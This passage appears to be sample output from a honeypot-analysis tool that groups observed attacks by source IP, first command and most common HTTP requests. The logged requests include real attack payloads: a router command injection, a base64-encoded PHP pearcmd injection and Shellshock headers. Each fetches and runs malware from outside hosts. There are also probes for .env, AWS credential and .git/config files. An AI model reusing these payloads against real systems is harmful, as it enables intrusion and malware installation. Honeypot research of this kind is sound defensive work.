#   '(KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 \n'                 #
#   'Host: 54.67.87.80',                                                        #
#   4),                                                                         #
#  ('HEAD /icons/.2e/.2e/apache2/icons/non-existant-image.png HTTP/1.1\n'       #
#   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ' #
#   '(KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 \n'                 #
#   'Host: 54.67.87.80',                                                        #
#   4)]                                                                         #
#                                                                               #
#################################################################################
######################
# most_common_src_ip #
######################
#                    #
# '185.180.143.49'   #
#                    #
######################



Attack (hhash: 51e82af9c7a10e0c74d49799d1344fd73a08d95cee17a9b7ed1644e981905f13), SourceIPs: 3, Sessions: 75, HTTP: 48, Httplogs: 16 
#################
# first_command #
#################
#               #
# None          #
#               #
#################
################################################################################
#                          most_common3_http_requests                          #
################################################################################
#                                                                              #
# [('GET / HTTP/1.1\nHost: 54.67.87.80', 3),                                   #
#  ('GET / HTTP/\nHost: 54.67.87.80', 3),                                      #
#  ('GET / HTTP/1.1\n'                                                         #
#   'User-Agent: Mozilla/5.0 (Linux; Android 6.0; HTC One M9 Build/MRA86362) ' #
#   'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.9103.98 Mobile '       #
#   'Safari/537.3\n'                                                           #
#   'Host: 54.67.87.80',                                                       #
#   3)]                                                                        #
#                                                                              #
################################################################################
######################
# most_common_src_ip #
######################
#                    #
# '164.92.192.25'    #
#                    #
######################



Attack (mhash: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c), SourceIPs: 3, Sessions: 24, SSH: 20, Commands: 3, Cmdlogs: 4, Malware: 3 
##########################
#     first_command      #
##########################
#                        #
# 'scp -t /tmp/BUwTrLEj' #
#                        #
##########################
##############################
# most_common3_http_requests #
##############################
#                            #
# []                         #
#                            #
##############################
######################
# most_common_src_ip #
######################
#                    #
# '93.223.169.159'   #
#                    #
######################



Attack (hhash: 6ef6eba782945c5c6d677a2ea8e1fc8320bfae6eb3800f5e7888c3b266479f00), SourceIPs: 2, Sessions: 26, HTTP: 20, Httplogs: 9 
#################
# first_command #
#################
#               #
# None          #
#               #
#################
#################################################################
#                   most_common3_http_requests                  #
#################################################################
#                                                               #
# [('HEAD / HTTP/1.0\n', 4),                                    #
#  ('GET /.git/config HTTP/1.1\n'                               #
#   'User-Agent: Go-http-client/1.1\n'                          #
#   'Host: ec2-54-67-87-80.us-west-1.compute.amazonaws.com:80', #
#   2),                                                         #
#  ('GET /static../.git/config HTTP/1.1\n'                      #
#   'User-Agent: Go-http-client/1.1\n'                          #
#   'Host: ec2-54-67-87-80.us-west-1.compute.amazonaws.com:80', #
#   2)]                                                         #
#                                                               #
#################################################################
######################
# most_common_src_ip #
######################
#                    #
# '91.92.249.164'    #
#                    #
######################



Attack (chash: 28ba533b0f3c4df63d6b4a5ead73860697bdf735bb353e4ca928474889eb8a15), SourceIPs: 1, Sessions: 1053, SSH: 771, Commands: 29, Cmdlogs: 1, 
#################
# first_command #
#################
#               #
# 'uname -a'    #
#               #
#################
##############################
# most_common3_http_requests #
##############################
#                            #
# []                         #
#                            #
##############################
######################
# most_common_src_ip #
######################
#                    #
# '150.158.27.38'    #
#                    #
######################



Attack (hhash: 50758fb09c87e81299ba39f366474396f6eb9a82068707505780307a7021ccd2), SourceIPs: 1, Sessions: 560, HTTP: 560, Httplogs: 560 
#################
# first_command #
#################
#               #
# None          #
#               #
#################
################################################################################
#                          most_common3_http_requests                          #
################################################################################
#                                                                              #
# [('GET /?pp=env HTTP/1.1\n'                                                  #
#   'User-Agent: Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) ' #
#   'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 ' #
#   'Moblie Safari/537.36\n'                                                   #
#   'Host: ec2-54-67-87-80.us-west-1.compute.amazonaws.com',                   #
#   1),                                                                        #
#  ('GET /.aws/credentials HTTP/1.1\n'                                         #
#   'User-Agent: Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) ' #
#   'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 ' #
#   'Moblie Safari/537.36\n'                                                   #
#   'Host: ec2-54-67-87-80.us-west-1.compute.amazonaws.com',                   #
#   1),                                                                        #
#  ('GET /.env HTTP/1.1\n'                                                     #
#   'User-Agent: Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) ' #
#   'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 ' #
#   'Moblie Safari/537.36\n'                                                   #
#   'Host: ec2-54-67-87-80.us-west-1.compute.amazonaws.com',                   #
#   1)]                                                                        #
#                                                                              #
################################################################################
######################
# most_common_src_ip #
######################
#                    #
# '188.166.224.136'  #
#                    #
######################



Attack (hhash: ffc86c13c2614123fced454ae877687ceae7759a81df85d61960f7c2079faf59), SourceIPs: 1, Sessions: 228, HTTP: 32, Httplogs: 15 
#################
# first_command #
#################
#               #
# None          #
#               #
#################
##################################################################################
#                           most_common3_http_requests                           #
##################################################################################
#                                                                                #
# [('GET / HTTP/1.1\n'                                                           #
#   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '  #
#   '(KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46\n'    #
#   'Host: 54.67.87.80',                                                         #
#   8),                                                                          #
#  ('GET / HTTP/1.1\nHost: 54.67.87.80:80', 6),                                  #
#  ('GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd ' #
#   '/tmp; rm -rf *; wget http://104.168.5.4/tenda.sh; chmod 777 '               #
#   'tenda.sh;./tenda.sh) HTTP/1.1\n'                                            #
#   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '  #
#   '(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\n'                       #
#   'Host: 54.67.87.80:80',                                                      #
#   6)]                                                                          #
#                                                                                #
##################################################################################
######################
# most_common_src_ip #
######################
#                    #
# '185.224.128.191'  #
#                    #
######################



Attack (hhash: 7da13397216e915d3648622960fa18ea26295ad5f180cf1346511991dc689ea9), SourceIPs: 1, Sessions: 142, HTTP: 142, Httplogs: 71 
#################
# first_command #
#################
#               #
# None          #
#               #
#################
###########################################################################
#                        most_common3_http_requests                       #
###########################################################################
#                                                                         #
# [('GET /.git/config HTTP/1.1\n'                                         #
#   'User-Agent: python-requests/2.28.1\n'                                #
#   'Host: 54.67.87.80',                                                  #
#   2),                                                                   #
#  ('GET /.env.production HTTP/1.1\n'                                     #
#   'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) ' #
#   'Gecko/20100101 Firefox/77.0\n'                                       #
#   'Host: 54.67.87.80',                                                  #
#   2),                                                                   #
#  ('POST /.env.production HTTP/1.1\n'                                    #
#   'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) ' #
#   'Gecko/20100101 Firefox/77.0\n'                                       #
#   'Host: 54.67.87.80',                                                  #
#   2)]                                                                   #
#                                                                         #
###########################################################################
######################
# most_common_src_ip #
######################
#                    #
# '91.92.243.167'    #
#                    #
######################



Attack (hhash: ed38805b5dd55c277dcbebb9c4db218b036f9cae287ba106cc774ec3da18bfcf), SourceIPs: 1, Sessions: 54, HTTP: 27, Httplogs: 27 
#################
# first_command #
#################
#               #
# None          #
#               #
#################
####################################################################################
#                            most_common3_http_requests                            #
####################################################################################
#                                                                                  #
# [('GET / HTTP/1.1\n'                                                             #
#   'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, ' #
#   'like Gecko) Chrome/66.0.3359.139 Safari/537.36\n'                             #
#   'Host: 54.67.87.80',                                                           #
#   1),                                                                            #
#  ('GET /wp-content/themes/twentytwentyone/assets/js/polyfills.js HTTP/1.1\n'     #
#   'User-Agent: Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\n'                 #
#   'Host: 54.67.87.80',                                                           #
#   1),                                                                            #
#  ('GET /wp-content/themes/twentytwentyone/assets/js/responsive-embeds.js '       #
#   'HTTP/1.1\n'                                                                   #
#   'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) '        #
#   'AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 '           #
#   'Safari/604.1\n'                                                               #
#   'Host: 54.67.87.80',                                                           #
#   1)]                                                                            #
#                                                                                  #
####################################################################################
######################
# most_common_src_ip #
######################
#                    #
# '23.20.205.139'    #
#                    #
######################



Attack (hhash: 4da3ee2625bb069ebb113ec1ce45b4f5b8ec39e3e743330b94f6c15e4c25f84a), SourceIPs: 1, Sessions: 35, HTTP: 30, Httplogs: 26 
#################
# first_command #
#################
#               #
# None          #
#               #
#################
#################################################################################
#                           most_common3_http_requests                          #
#################################################################################
#                                                                               #
# [('GET / HTTP/1.1\n'                                                          #
#   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ' #
#   '(KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 \n'                 #
#   'Host: 54.67.87.80',                                                        #
#   4),                                                                         #
#  ('GET / HTTP/1.1\n'                                                          #
#   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ' #
#   '(KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 \n'                 #
#   'Host: 54.67.87.80:8000',                                                   #
#   2),                                                                         #
#  ('GET /admin/ HTTP/1.1\n'                                                    #
#   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ' #
#   '(KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 \n'                 #
#   'Host: 54.67.87.80:8000',                                                   #
#   1)]                                                                         #
#                                                                               #
#################################################################################
######################
# most_common_src_ip #
######################
#                    #
# '185.180.143.80'   #
#                    #
######################



Attack (hhash: 30d72557f4e8b64fba88e86ce784ac08339fca517863f30d194830c90ff72a01), SourceIPs: 1, Sessions: 34, HTTP: 2, Httplogs: 2 
#################
# first_command #
#################
#               #
# None          #
#               #
#################
########################################################################################################################
#                                              most_common3_http_requests                                              #
########################################################################################################################
#                                                                                                                      #
# [('GET '                                                                                                             #
#   '/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?shell_exec(base64_decode("b #
# WtkaXIgLXAgL3RtcC8kKHdob2FtaSkgJiYgY2QgL3RtcC8kKHdob2FtaSk7IHdnZXQgaHR0cDovLzQ1Ljk1LjE0Ny4yMzYvZG93bmxvYWQvcmVkdGFpb #
# C54ODZfNjQ7IGN1cmwgLU8gaHR0cDovLzQ1Ljk1LjE0Ny4yMzYvZG93bmxvYWQvcmVkdGFpbC54ODZfNjQ7IHJtIC1yZiAucmVkdGFpbDsgbXYgcmVkd #
# GFpbC54ODZfNjQgLnJlZHRhaWw7IGNobW9kICt4IC5yZWR0YWlsOyAuLy5yZWR0YWls"));?>+/tmp/ohhellohttpserver.php '               #
#   'HTTP/1.1\n'                                                                                                       #
#   'User-Agent: Mozilla/5.0\n'                                                                                        #
#   'Host: 54.67.87.80:8080',                                                                                          #
#   1),                                                                                                                #
#  ('GET /index.php?lang=../../../../../../../../tmp/ohhellohttpserver HTTP/1.1\n'                                     #
#   'User-Agent: Mozilla/5.0\n'                                                                                        #
#   'Host: 54.67.87.80:8080',                                                                                          #
#   1),                                                                                                                #
#  ('GET '                                                                                                             #
#   '/index.php?s=index/index/index/think_lang/../../extend/pearcmd/pearcmd/index&cmd=echo${IFS}bWtkaXIgLXAgL3RtcC8kKH #
# dob2FtaSkgJiYgY2QgL3RtcC8kKHdob2FtaSk7IHdnZXQgaHR0cDovLzQ1Ljk1LjE0Ny4yMzYvZG93bmxvYWQvcmVkdGFpbC54ODZfNjQ7IGN1cmwgLU #
# 8gaHR0cDovLzQ1Ljk1LjE0Ny4yMzYvZG93bmxvYWQvcmVkdGFpbC54ODZfNjQ7IHJtIC1yZiAucmVkdGFpbDsgbXYgcmVkdGFpbC54ODZfNjQgLnJlZH #
# RhaWw7IGNobW9kICt4IC5yZWR0YWlsOyAuLy5yZWR0YWls|base64${IFS}-d|sh '                                                   #
#   'HTTP/1.1\n'                                                                                                       #
#   'User-Agent: Mozilla/5.0\n'                                                                                        #
#   'Host: 54.67.87.80:8080',                                                                                          #
#   1)]                                                                                                                #
#                                                                                                                      #
########################################################################################################################
######################
# most_common_src_ip #
######################
#                    #
# '45.95.147.236'    #
#                    #
######################



Attack (hhash: 79cee4cdd57b016e9a6cdc9b23385b110da33ec808b64670bcf45b0661db1a65), SourceIPs: 1, Sessions: 28, HTTP: 24, Httplogs: 24 
#################
# first_command #
#################
#               #
# None          #
#               #
#################
###################################################################################
#                            most_common3_http_requests                           #
###################################################################################
#                                                                                 #
# [('GET /c/msdownload/update/software/update/2021/11/6632de33-967441-x86.cab '   #
#   'HTTP/1.1\n'                                                                  #
#   'User-Agent: Windows-Update-Agent/10.0.10011.16384 Client-Protocol/2.31\n'    #
#   'Host: docs.microsoft.com',                                                   #
#   2),                                                                           #
#  ("GET /fw6I HTTP/1.1\nUser-Agent: 'Mozilla/5.0\nHost: 54.67.87.80:7547", 2),   #
#  ('GET /Visu/ens/events HTTP/1.1\n'                                             #
#   'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, ' #
#   'like Gecko) Chrome/58.0.3029.110 Safari/537.36\n'                            #
#   'Host: www.wlanquna.club',                                                    #
#   2)]                                                                           #
#                                                                                 #
###################################################################################
######################
# most_common_src_ip #
######################
#                    #
# '43.135.123.64'    #
#                    #
######################



Attack (hhash: 0b60b47c6cbbec8f0c44289158db12490185b6ef821e8b1946a745c8b300ac67), SourceIPs: 1, Sessions: 25, HTTP: 23, Httplogs: 22 
#################
# first_command #
#################
#               #
# None          #
#               #
#################
###################################################################################
#                            most_common3_http_requests                           #
###################################################################################
#                                                                                 #
# [("GET /is-bin HTTP/1.1\nUser-Agent: 'Mozilla/5.0\nHost: 54.67.87.80:8080", 2), #
#  ('GET /c/msdownload/update/software/update/2021/11/6632de33-967441-x86.cab '   #
#   'HTTP/1.1\n'                                                                  #
#   'User-Agent: Windows-Update-Agent/10.0.10011.16384 Client-Protocol/2.31\n'    #
#   'Host: docs.microsoft.com',                                                   #
#   2),                                                                           #
#  ("GET /fw6I HTTP/1.1\nUser-Agent: 'Mozilla/5.0\nHost: 54.67.87.80:8080", 2)]   #
#                                                                                 #
###################################################################################
######################
# most_common_src_ip #
######################
#                    #
# '43.132.196.160'   #
#                    #
######################



Attack (hhash: f9a22a65178153d25e6a84189570709a0aced94197404093eff5cea464b865ac), SourceIPs: 1, Sessions: 14, HTTP: 12, Httplogs: 11 
#################
# first_command #
#################
#               #
# None          #
#               #
#################
####################################################################################
#                            most_common3_http_requests                            #
####################################################################################
#                                                                                  #
# [('POST /debug/default/view?panel=config HTTP/1.1\n'                             #
#   'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like ' #
#   'Gecko) Chrome/81.0.4044.129 Safari/537.36\n'                                  #
#   'Host: 54.67.87.80',                                                           #
#   2),                                                                            #
#  ('GET /_profiler/phpinfo HTTP/1.1\n'                                            #
#   'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like ' #
#   'Gecko) Chrome/81.0.4044.129 Safari/537.36\n'                                  #
#   'Host: 54.67.87.80',                                                           #
#   1),                                                                            #
#  ('POST / HTTP/1.1\n'                                                            #
#   'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like ' #
#   'Gecko) Chrome/81.0.4044.129 Safari/537.36\n'                                  #
#   'Host: 54.67.87.80',                                                           #
#   1)]                                                                            #
#                                                                                  #
####################################################################################
######################
# most_common_src_ip #
######################
#                    #
# '20.197.51.98'     #
#                    #
######################



Attack (hhash: a23e9121e296bd9ba20a37c2cc6f2fab5285e2f6efd635841d835724544d6758), SourceIPs: 1, Sessions: 11, HTTP: 10, Httplogs: 10 
#################
# first_command #
#################
#               #
# None          #
#               #
#################
##################################################################################
#                           most_common3_http_requests                           #
##################################################################################
#                                                                                #
# [('GET /env/.env HTTP/1.1\n'                                                   #
#   'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) '               #
#   'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\n' #
#   'Host: 54.67.87.80:7547',                                                    #
#   2),                                                                          #
#  ('GET /phpinfo HTTP/1.1\n'                                                    #
#   'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) '               #
#   'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\n' #
#   'Host: 54.67.87.80:7547',                                                    #
#   2),                                                                          #
#  ('GET /xampp/info.php HTTP/1.1\n'                                             #
#   'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) '               #
#   'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\n' #
#   'Host: 54.67.87.80:7547',                                                    #
#   2)]                                                                          #
#                                                                                #
##################################################################################
######################
# most_common_src_ip #
######################
#                    #
# '103.121.39.54'    #
#                    #
######################



Attack (hhash: bc816b9b031183662a273fbc558312d1b2950f19a0d2d91345474a152011f6bf), SourceIPs: 1, Sessions: 8, HTTP: 4, Httplogs: 1 
#################
# first_command #
#################
#               #
# None          #
#               #
#################
#####################################################################
#                     most_common3_http_requests                    #
#####################################################################
#                                                                   #
# [('POST /cgi-bin/luci/;stok=/locale?form=country HTTP/1.1\n', 4), #
#  ('POST /cgi-bin/luci/;stok=/locale?form=country HTTP/\n', 4)]    #
#                                                                   #
#####################################################################
######################
# most_common_src_ip #
######################
#                    #
# '120.63.180.123'   #
#                    #
######################



Attack (hhash: 11d146661a0270a1b386d4deb731a582304e4ef28ab7d59c2d076547cb16c8d1), SourceIPs: 1, Sessions: 4, HTTP: 1, Httplogs: 1 
#################
# first_command #
#################
#               #
# None          #
#               #
#################
##################################################################################
#                           most_common3_http_requests                           #
##################################################################################
#                                                                                #
# [('GET /env/.env HTTP/1.1\n'                                                   #
#   'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) '               #
#   'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\n' #
#   'Host: 54.67.87.80',                                                         #
#   2),                                                                          #
#  ('GET /phpinfo HTTP/1.1\n'                                                    #
#   'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) '               #
#   'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\n' #
#   'Host: 54.67.87.80',                                                         #
#   2),                                                                          #
#  ('GET /xampp/info.php HTTP/1.1\n'                                             #
#   'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) '               #
#   'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\n' #
#   'Host: 54.67.87.80',                                                         #
#   2)]                                                                          #
#                                                                                #
##################################################################################
######################
# most_common_src_ip #
######################
#                    #
# '62.171.167.21'    #
#                    #
######################



Attack (hhash: 3b6819f4180302fda913f82fcc8c8b4de5370e7d761872207a5dbf0cc2f750f7), SourceIPs: 1, Sessions: 4, HTTP: 1, Httplogs: 1 
#################
# first_command #
#################
#               #
# None          #
#               #
#################
#################################################################################
#                           most_common3_http_requests                          #
#################################################################################
#                                                                               #
# [('GET / HTTP/1.1\n'                                                          #
#   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ' #
#   '(KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246\n'      #
#   'Host: 54.67.87.80',                                                        #
#   5),                                                                         #
#  ('GET /.env.local HTTP/1.1\n'                                                #
#   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ' #
#   '(KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246\n'      #
#   'Host: 54.67.87.80',                                                        #
#   3),                                                                         #
#  ('GET /public/.env HTTP/1.1\n'                                               #
#   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ' #
#   '(KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246\n'      #
#   'Host: 54.67.87.80',                                                        #
#   3)]                                                                         #
#                                                                               #
#################################################################################
######################
# most_common_src_ip #
######################
#                    #
# '3.93.0.214'       #
#                    #
######################



Attack (hhash: 846f2a6c936a5c60bf416fa277a315d852da3ed0f52d2c9e22aca882ad3e17d2), SourceIPs: 1, Sessions: 4, HTTP: 4, Httplogs: 3 
#################
# first_command #
#################
#               #
# None          #
#               #
#################
####################################################################################
#                            most_common3_http_requests                            #
####################################################################################
#                                                                                  #
# [('GET /manager/html HTTP/1.1\n'                                                 #
#   'User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; '      #
#   'Trident/6.0)\n'                                                               #
#   'Host: 54.67.87.80:8080',                                                      #
#   2),                                                                            #
#  ('GET / HTTP/1.1\n'                                                             #
#   'User-Agent: () { :; }; /bin/bash -c "rm -rf /tmp/*;echo wget '                #
#   'http://houmen.linux22.cn/houmen/linux223 -O /tmp/China.Z-dukk >> '            #
#   '/tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 '              #
#   '/tmp/China.Z-dukk >> /tmp/Run.sh;echo /tmp/China.Z-dukk >> /tmp/Run.sh;echo ' #
#   'rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh"\n'       #
#   'Host: 54.67.87.80\n'                                                          #
#   'Referrer: () { :; }; /bin/bash -c "rm -rf /tmp/*;echo wget '                  #
#   'http://houmen.linux22.cn/houmen/linux223 -O /tmp/China.Z-dukk >> '            #
#   '/tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 '              #
#   '/tmp/China.Z-dukk >> /tmp/Run.sh;echo /tmp/China.Z-dukk >> /tmp/Run.sh;echo ' #
#   'rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh"',        #
#   1),                                                                            #
#  ('GET / HTTP/1.1\n'                                                             #
#   'User-Agent: () { :; }; /bin/bash -c "rm -rf /tmp/*;echo wget '                #
#   'http://houmen.linux22.cn/houmen/linux223 -O /tmp/China.Z-gsub >> '            #
#   '/tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 '              #
#   '/tmp/China.Z-gsub >> /tmp/Run.sh;echo /tmp/China.Z-gsub >> /tmp/Run.sh;echo ' #
#   'rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh"\n'       #
#   'Host: 54.67.87.80\n'                                                          #
#   'Referrer: () { :; }; /bin/bash -c "rm -rf /tmp/*;echo wget '                  #
#   'http://houmen.linux22.cn/houmen/linux223 -O /tmp/China.Z-gsub >> '            #
#   '/tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 '              #
#   '/tmp/China.Z-gsub >> /tmp/Run.sh;echo /tmp/China.Z-gsub >> /tmp/Run.sh;echo ' #
#   'rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh"',        #
#   1)]                                                                            #
#                                                                                  #
####################################################################################
######################
# most_common_src_ip #
######################
#                    #
# '123.99.201.37'    #
#                    #
######################



Attack (chash: c4927e4103e250b181e76582991f71a7a3987ccae02ad1fc8cff377e65871199), SourceIPs: 1, Sessions: 3, SSH: 2, Commands: 21, Cmdlogs: 1, 
#############################
#       first_command       #
#############################
#                           #
# 'echo 1 && cat /bin/echo' #
#                           #
#############################
##############################
# most_common3_http_requests #
##############################
#                            #
# []                         #
#                            #
##############################
######################
# most_common_src_ip #
######################
#                    #
# '47.120.37.43'     #
#                    #
######################



Attack (hhash: 3c9d7241372c627d30ffb3a9868fbf4c4fc2ec4b0c4e0ac7909ddfcefc6bcaf9), SourceIPs: 1, Sessions: 2, HTTP: 2, Httplogs: 2 
#################
# first_command #
#################
#               #
# None          #
#               #
#################
################################################################################
#                          most_common3_http_requests                          #
################################################################################
#                                                                              #
# [('POST / HTTP/1.1\n'                                                        #
#   'User-Agent: Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L '       #
#   'Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile ' #
#   'Safari/534.30\n'                                                          #
#   'Host: 54.67.87.80',                                                       #
#   1),                                                                        #
#  ('GET /env HTTP/1.1\n'                                                      #
#   'User-Agent: Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L '       #
#   'Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile ' #
#   'Safari/534.30\n'                                                          #
#   'Host: 54.67.87.80',                                                       #
#   1),                                                                        #
#  ('GET /twilio.env HTTP/1.1\n'                                               #
#   'User-Agent: Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L '       #
#   'Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile ' #
#   'Safari/534.30\n'                                                          #
#   'Host: 54.67.87.80',                                                       #
#   1)]                                                                        #
#                                                                              #
################################################################################
######################
# most_common_src_ip #
######################
#                    #
# '102.37.103.237'   #
#                    #
######################



Attack (hhash: d9e9714edf4333cdaeeaa837d3542451931a587a47d48afce527cfc81ea8e144), SourceIPs: 1, Sessions: 1, HTTP: 1, Httplogs: 1 
#################
# first_command #
#################
#               #
# None          #
#               #
#################
#################################################################################
#                           most_common3_http_requests                          #
#################################################################################
#                                                                               #
# [('GET / HTTP/1.1\n'                                                          #
#   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ' #
#   '(KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246\n'      #
#   'Host: ec2-54-67-87-80.us-west-1.compute.amazonaws.com',                    #
#   2),                                                                         #
#  ('GET /.env.local HTTP/1.1\n'                                                #
#   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ' #
#   '(KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246\n'      #
#   'Host: ec2-54-67-87-80.us-west-1.compute.amazonaws.com',                    #
#   2),                                                                         #
#  ('GET /public/.env HTTP/1.1\n'                                               #
#   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ' #
#   '(KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246\n'      #
#   'Host: ec2-54-67-87-80.us-west-1.compute.amazonaws.com',                    #
#   2)]                                                                         #
#                                                                               #
#################################################################################
######################
# most_common_src_ip #
######################
#                    #
# '103.85.95.36'     #
#                    #
######################
    
Honeypot AI Finished Successfully!   
    """,
    


    "only_attacks": """
lucasfaudman@Lucass-MacBook-Pro testenv % honeypot-ai/run.sh -lfa --only-attacks c4927e4103e250b181e76582991f71a7a3987ccae02ad1fc8cff377e65871199 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c --print-attrs source_ips uniq_dst_ports sessions commands malware
Starting honeypot-ai...

Loading attacks from attacks directory at /Users/lucasfaudman/Documents/SANS/testenv/attacks
Loading 2 attacks in parallel with 2 workers.
WARNING: Output may be jumbled. If errors occur, try again with --load-attacks-max-workers 1
Loading Attack: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x11302b810>
Loading Attack: c4927e4103e250b181e76582991f71a7a3987ccae02ad1fc8cff377e65871199
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x10fc7f610>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x11302bb50>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x10fda7850>
Loaded Attack: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c
Loaded Attack: c4927e4103e250b181e76582991f71a7a3987ccae02ad1fc8cff377e65871199
(4->4) - Removed 0 attacks with ips ['216.243.47.166', '172.31.5.68', '54.67.87.80']
Attempting merge 36: b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f <- c4927e4103e250b181e76582991f71a7a3987ccae02ad1fc8cff377e65871199 by malware_urls
Merged 0 attacks by out of 36 attempts (0.0000%) 
Merge Attacks Time: 0.0058s
(4->4) - Merged 0 attacks with shared attrs
Regex merged 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 into 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c on commands: re.compile('cd /tmp && chmod \\+x [\\w\\d]+ && bash -c ./[\\w\\d]+')
Regex merged b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f into 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c on commands: re.compile('cd /tmp && chmod \\+x [\\w\\d]+ && bash -c ./[\\w\\d]+')
(4->2) - Merged 2 attacks with shared sig regexes


